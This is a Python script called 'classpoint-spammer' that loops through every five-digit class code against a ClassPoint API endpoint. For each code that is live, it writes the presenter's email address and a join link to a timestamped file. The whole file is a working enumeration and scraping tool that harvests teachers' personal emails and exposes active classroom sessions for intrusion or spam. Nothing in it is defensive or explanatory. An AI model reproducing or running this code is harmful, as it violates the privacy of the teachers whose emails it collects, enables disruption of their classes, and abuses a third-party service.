import os
import sys
import time
import requests

def print_version(extra=""):
    print("classpoint-spammer v1.0.0" + extra)

def parse_args(args):
    if args[0] == "-h":
        print("Usage: python3 main.py [OPTIONS]\n\nOptions:\n  -h, --help\t\tShow this help message and exit\n  -o, --output\t\tOutput file name and exit\n  -v, --version\t\tShow program's version number and exit\n\nIf no options are provided, the program will run with default settings.")
        sys.exit(0)
    elif args[0] == "-o" or args[0] == "--output":
        print("Output file name: /links/links_{current_datetime}.txt")
        sys.exit(0)
    elif args[0] == "-v" or args[0] == "--version":
        print_version()
        sys.exit(0)
    else:
        print("Invalid option. Use -h or --help for help.")
        sys.exit(1)

os.chdir(os.path.dirname(os.path.abspath(__file__)))
starttime = time.strftime("%d-%m-%y_%H:%M:%S")

if not os.path.isdir("links"):
    os.mkdir("links")

if len(sys.argv) > 1:
    parse_args(sys.argv[1:])

print("\033c")
print_version("\nSearching...\n")

# create the file in write mode
with open(f"links/links_{starttime}.txt", "w") as f:
    f.write("")

code = 10000

while code < 99999:
    data = requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={code}")
    if data.status_code != 200:
        code += 1
        continue

    resData = data.json()

    with open(f"links/links_{starttime}.txt", "a") as f:
        f.write(f"Email: {resData['presenterEmail']}\nhttps://www.classpoint.app/?code={code}\n\n")

    print("Class code found: " + str(code))
    print("Link saved.\n")

    code += 1

print("Search completed. Links saved to links/links_" + starttime + ".txt\n")
